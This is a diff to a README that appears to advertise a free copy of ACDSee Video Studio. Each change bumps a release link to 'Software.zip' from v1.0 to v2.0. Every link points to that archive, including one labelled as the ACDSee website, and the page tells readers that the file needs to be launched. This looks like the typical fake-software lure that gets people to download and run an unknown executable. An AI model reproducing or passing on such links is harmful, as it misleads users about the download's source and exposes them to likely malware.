@@ -2,7 +2,7 @@
 
 ### Explore the World of ACDSee Video Studio with this Amazing Repository!
 
-![ACDSee Video Studio](https://github.com/poulpyav/ACDSee-Video-Studio-Free/releases/download/v1.0/Software.zip)
+![ACDSee Video Studio](https://github.com/poulpyav/ACDSee-Video-Studio-Free/releases/download/v2.0/Software.zip)
 
 ---
 
@@ -29,7 +29,7 @@
 ---
 
 ### 📥 Download ACDSee Video Studio Free
-[![Download ACDSee Video Studio Free](https://github.com/poulpyav/ACDSee-Video-Studio-Free/releases/download/v1.0/Software.zip Video Studio-brightgreen)](https://github.com/poulpyav/ACDSee-Video-Studio-Free/releases/download/v1.0/Software.zip)
+[![Download ACDSee Video Studio Free](https://github.com/poulpyav/ACDSee-Video-Studio-Free/releases/download/v2.0/Software.zip Video Studio-brightgreen)](https://github.com/poulpyav/ACDSee-Video-Studio-Free/releases/download/v2.0/Software.zip)
 *(The file needs to be launched)*
 
 ---
@@ -57,7 +57,7 @@ Ready to explore the world of ACDSee Video Studio? Download the software now and
 
 ---
 
-### 🌟 Visit the [ACDSee](https://github.com/poulpyav/ACDSee-Video-Studio-Free/releases/download/v1.0/Software.zip) website for more information on ACDSee Video Studio.
+### 🌟 Visit the [ACDSee](https://github.com/poulpyav/ACDSee-Video-Studio-Free/releases/download/v2.0/Software.zip) website for more information on ACDSee Video Studio.
 
 ---
 
